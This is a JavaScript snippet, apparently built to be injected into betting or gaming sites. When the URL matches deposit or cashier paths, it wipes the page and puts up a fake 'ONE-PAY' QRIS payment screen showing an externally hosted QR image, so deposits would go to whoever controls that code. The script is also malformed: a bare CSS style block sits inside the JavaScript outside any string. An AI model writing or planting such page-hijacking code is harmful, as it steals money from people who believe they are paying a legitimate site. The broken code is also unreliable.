(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  const shouldRun = match.some(path => url.includes(path));
  if (!shouldRun) return;

  // Hapus konten lama dengan cara yang aman
  document.head.innerHTML = '';
  document.body.innerHTML = '';

  // =============== HEAD CONTENT ===============
  document.head.innerHTML = `
    <meta charset="UTF-8">
    <meta name="format-detection" content="telephone=no">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ONE-PAY - Pembayaran QRIS</title>
    <link href="https://fonts.googleapis.com/css?family=Figtree" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  `;
 <style>
        /* CSS yang sudah ada sebelumnya (dari jawaban pertama) */
        body,
        html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            font-family: "Figtree", sans-serif;
            background-color: #f0f2f5;
        }

        .container {
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 450px;
            min-height: 100vh;
            margin: 0 auto;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            background-color: white;
        }

        .section {
            padding: 15px;
            text-align: center;
            color: white;
            font-size: 16px;
            flex-shrink: 0;
        }

        .header-section {
            background-color: #00b4ff;
            font-weight: 700;
            font-size: 20px;
            padding: 20px 15px;
            border-bottom: 5px solid #00a0e0;
        }

        /* ----- Start of new datetime styles ----- */
        .datetime-container {
            background-color: #2c3e50; /* Warna latar belakang gelap untuk jam */
            padding: 10px 15px;
            text-align: center;
            color: white;
            font-family: 'Roboto Mono', monospace; /* Font monospace untuk angka */
            font-size: 2.5em; /* Ukuran jam */
            font-weight: bold;
            letter-spacing: 2px;
            display: flex; /* Untuk menengahkan jam */
            justify-content: center; /* Untuk menengahkan jam */
            align-items: center; /* Untuk menengahkan jam */
            height: 70px; /* Tinggi kontainer jam */
        }
        /* ----- End of new datetime styles ----- */


        .info-section {
            background-color: #194ba2;
            padding: 25px 15px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        .info-section p {
            margin: 0;
        }

        .first-p {
            font-size: 16px;
            font-weight: 500;
        }

        .second-p {
            font-size: 18px;
            color: #77ec83;
            font-weight: 700;
        }

        .detail-section {
            background-color: #1f1f1f;
            padding: 25px 15px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .details {
            display: flex;
            width: 100%;
            max-width: 300px;
            justify-content: space-between;
            align-items: flex-start;
        }

        .params,
        .values {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            text-align: left;
        }

        .values {
            align-items: flex-end;
            text-align: right;
        }

        .params span,
        .values span {
            color: white;
            padding: 5px 0;
            font-size: 16px;
        }

        .values span:last-child {
            font-size: 20px !important;
            color: #f9cf79 !important;
            font-weight: bold;
        }

        .qr-section {
            background-color: #f5f5f5;
            padding: 30px 15px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            flex-grow: 1;
            color: #333;
        }

        .logo-qris {
            margin-bottom: 20px;
        }

        .account-info-qr {
            background-color: white;
            border: 1px solid #ddd;
            border-radius: 15px;
            padding: 15px; /* Mengurangi padding sedikit */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 90%;
            max-width: 280px; /* Ukuran maksimum untuk QR container */
            aspect-ratio: 1 / 1;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }

        .qris-image {
            max-width: 100%;
            height: auto;
            display: block;
            border-radius: 10px;
        }

        .qr-label {
            margin-top: 15px;
            font-size: 16px;
            color: #555;
            font-weight: 900;
        }

        .qr-info {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
            text-align: center;
            max-width: 80%;
        }

        .footer-section {
            background-color: #f5f5f5;
            padding: 20px 15px;
            border-top: 1px solid #eee;
            margin-top: auto;
        }

        .green-button {
            background-color: #3aa82d;
            color: white;
            border: none;
            padding: 12px 25px;
            cursor: pointer;
            border-radius: 8px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.15);
            transition: transform 0.2s, box-shadow 0.2s;
            text-decoration: none;
            font-size: 16px;
            font-weight: 600;
            display: inline-block;
            width: 80%;
            max-width: 250px;
        }

        .green-button:hover {
            transform: translateY(-2px);
            box-shadow: 0px 6px 10px rgba(0, 0, 0, 0.2);
        }

        /* Media Queries for Responsiveness */
        @media (max-width: 480px) {
            .section {
                padding: 10px;
                font-size: 14px;
            }

            .header-section {
                font-size: 18px;
                padding: 15px 10px;
            }

            .datetime-container {
                font-size: 2em; /* Mengurangi ukuran jam di layar kecil */
                height: 60px;
            }

            .info-section {
                padding: 20px 10px;
            }

            .first-p {
                font-size: 14px;
            }

            .second-p {
                font-size: 16px;
            }

            .detail-section {
                padding: 20px 10px;
            }

            .params span,
            .values span {
                font-size: 14px;
            }

            .values span:last-child {
                font-size: 18px !important;
            }

            .qr-section {
                padding: 20px 10px;
            }

            .account-info-qr {
                padding: 10px; /* Mengurangi padding lagi */
                max-width: 220px;
            }

            .qr-label {
                font-size: 14px;
                margin-top: 10px;
            }

            .qr-info {
                font-size: 12px;
                margin-top: 15px;
            }

            .green-button {
                padding: 10px 20px;
                font-size: 15px;
                width: 90%;
            }
        }
    </style>
  // =============== BODY CONTENT ===============
  document.body.innerHTML = `
    <div class="container">
        <div class="section header-section">
            PEMBAYARAN DENGAN QRIS
        </div>
        <div class="section info-section">
            <p class="first-p" id="exp-note">Segera Lakukan Pembayaran Melalui QRIS Maksimal 1 Jam</p>
            <p class="second-p" id="exp-date"></p>
        </div>
        <div class="section detail-section">
            <div class="details" id="payment-info">
                <div class="params">
                    <span>Metode Pembayaran</span>
                    <span>Nominal</span>
                    <span>Total Pembayaran</span>
                </div>
                <div class="values">
                    <span style="text-transform:uppercase">QRIS</span>
                    <span>Rp</span>
                    <span style="color:#f9cf79; font-weight: bold;"></span>
                </div>
            </div>
        </div>
        <div class="section qr-section">
            <img src="https://i.postimg.cc/j2y4ndWY/Cuplikan-layar-2025-09-03-071242.png"
                 style="max-width: 50%;" alt="logo-qris" class="logo-qris">
            <div class="account-info-qr" id="payment-detail-qr">
                <img src="https://i.postimg.cc/j2y4ndWY/Cuplikan-layar-2025-09-03-071242.png"
                     style="max-width:97%;height:auto; margin-top:5px;" alt="QRIS Code" class="qris-image">
            </div>
            <p class="qr-label">Scan QRIS ini untuk pembayaran</p>
            <p class="no-qr-message"><span id="timeDisplay"></span></p>
            <p class="qr-info">Pastikan total pembayaran sesuai dengan nominal yang tertera.</p>
        </div>
        <div class="section footer-section">
            <a href="../" class="green-button" id="payment-button">TUTUP</a>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"><\/script>
  `;

  // =============== SCRIPT TAMBAHAN ===============
  function updateTime() {
      const now = new Date();
      const optionsTime = {
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: false
      };
      const formattedTime = now.toLocaleTimeString('id-ID', optionsTime);
      document.getElementById('timeDisplay').textContent = formattedTime;
  }
  updateTime();
  setInterval(updateTime, 1000);

  window.GameAlert = function() {
      alert('Maaf! Game Masih Dalam Tahap Perkembangan!');
  };
})();
